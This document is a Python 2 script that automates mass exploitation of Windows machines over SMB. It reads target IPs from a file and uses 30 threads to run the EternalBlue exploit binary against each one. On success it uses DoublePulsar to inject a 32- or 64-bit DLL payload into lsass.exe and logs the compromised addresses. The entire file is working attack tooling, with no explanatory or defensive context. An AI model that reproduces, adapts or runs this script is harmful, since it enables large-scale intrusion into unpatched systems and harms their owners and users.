# !/usr/bin/env python  
# -*- coding:utf-8 -*-
import urllib2,sys
import base64,subprocess
import Queue,threading
from threading import Thread

class Worker(Thread):   
   worker_count = 0   
   def __init__( self, workQueue, timeout = 0, **kwds):   
       Thread.__init__( self, **kwds )   
       self.id = Worker.worker_count   
       Worker.worker_count += 1   
       self.setDaemon( True )   
       self.workQueue = workQueue     
       self.timeout = timeout   
       self.start()   
   def run( self ):   
       ''' the get-some-work, do-some-work main loop of worker threads '''   
       while True:   
           try:   
               func,ip = self.workQueue.get(timeout=self.timeout)   
               func(ip)
           except Queue.Empty:   
               break   
                  
class WorkerManager:   
   def __init__( self, num_of_workers=15, timeout = 1):   
       self.workQueue = Queue.Queue()   
       self.workers = [] 
       self.timeout = timeout   
       self._recruitThreads( num_of_workers )   
   def _recruitThreads( self, num_of_workers ):   
       for i in range( num_of_workers ):   
           worker = Worker( self.workQueue, self.timeout )   
           self.workers.append(worker)   
   def wait_for_complete( self):   
       # ...then, wait for each of them to terminate:   
       while len(self.workers):   
           worker = self.workers.pop()   
           worker.join( )   
           if worker.isAlive() and not self.workQueue.empty():   
               self.workers.append( worker )  
   def add_job( self, target):   
       self.workQueue.put( target)
   def stop():
   		 self.task_done() 

def attack(ip):
	print "IP: %s" %ip
	arg = "--VerifyTarget True --VerifyBackdoor True --TargetIp " + ip
	proc = subprocess.Popen("Eternalblue-2.2.0.exe " + arg, stdout=subprocess.PIPE)
	buf,x = proc.communicate()
	if buf.find("Backdoor returned code: 10 - Success") < 0:
		return 
	print 'IP: %s Success!!'%ip
	
	#connet backdoor
	arg = "--Function RunDll --TargetPort 445 --DllOrdinal 1 --NetworkTimeout 20 --Protocol SMB --ProcessName lsass.exe --TargetIp " + ip
	if buf.find("64-bit")>0:
		arg += " --Architecture x64 --DllPayload x64.dll "
		print 'IP: %s is 64-bit' %ip
	elif buf.find("32-bit")>0:
		arg += " --Architecture x86 --DllPayload x86.dll "
		print 'IP: %s is 86-bit' %ip
	else:
		ping_func = "--Function Ping --TargetIp " + ip
		proc = subprocess.Popen("Doublepulsar-1.3.1.exe " + ping_func, stdout=subprocess.PIPE)
		buf,x = proc.communicate()
		if buf.find("64-bit")>0:
			arg += " --Architecture x64 --DllPayload x64.dll "
			print 'IP: %s is 64-bit' %ip
		elif buf.find("32-bit")>0:
			arg += " --Architecture x86 --DllPayload x86.dll "
			print 'IP: %s is 86-bit' %ip
		else:
			print 'Architecture error'
	proc = subprocess.Popen("Doublepulsar-1.3.1.exe " + arg, stdout=subprocess.PIPE)
	buf,x = proc.communicate()
	if buf.find("Command completed successfully")>0:
		print "IP: %s -> Got!!!" %ip
		f = file("f:\log.txt","a")
		f.write(ip + "\r\n")
		f.close()
	
def main():

	ips = []
	f = file( 'f:\ips.txt', 'r')
	line = f.readline()
	line.strip()
	
	while line<>'':
		ips.append(line.strip())
		line = f.readline()
	f.close()
	wm = WorkerManager(30)
	for ip in ips:
		wm.add_job((attack,ip))
	wm.wait_for_complete()
	print 'Done'
	
if __name__ == "__main__":
	main()
